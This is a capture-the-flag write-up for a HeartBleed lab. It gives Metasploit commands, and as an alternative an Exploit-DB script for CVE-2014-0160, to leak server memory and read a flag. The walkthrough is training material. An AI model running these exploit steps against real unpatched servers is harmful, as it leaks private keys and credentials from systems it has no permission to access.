# HeartBleed

## In this task, you need to obtain a flag using a very well-known vulnerability. Make sure you pay attention to all the information and errors displayed. Pay particular attention to how web servers are configured.

### What is the flag?

Hint: `https://<ip>`

1. Exploit vulnerability using Metasploit

```Bash
msfconsole -q
search heartbleed
use 4
```

[SCREEN01]

```Bash
set rhosts <IP>
set verbose true
run
```

[SCREEN02]

2. Get the flag from message

[SCREEN03]

### Alternative way:

1. Run the [CVE 2014-0160](https://www.exploit-db.com/exploits/32745) (Remember to set scrollback to 'Unlimited')

```Bash
python 32745.py <IP> -p 443
```

[SCREEN04]
[SCREEN05]
